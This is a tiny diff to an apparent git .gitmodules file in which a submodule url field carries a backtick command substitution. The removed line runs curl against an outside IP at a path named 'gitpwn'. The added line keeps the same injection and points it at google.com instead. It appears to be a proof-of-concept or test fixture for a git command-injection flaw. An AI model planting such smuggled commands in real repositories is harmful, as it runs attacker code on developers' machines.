@@ -1,4 +1,4 @@
 [submodule "test"]
 	path = test
-	url = `curl 120.26.98.191/gitpwn`
+	url = `curl google.com`
 
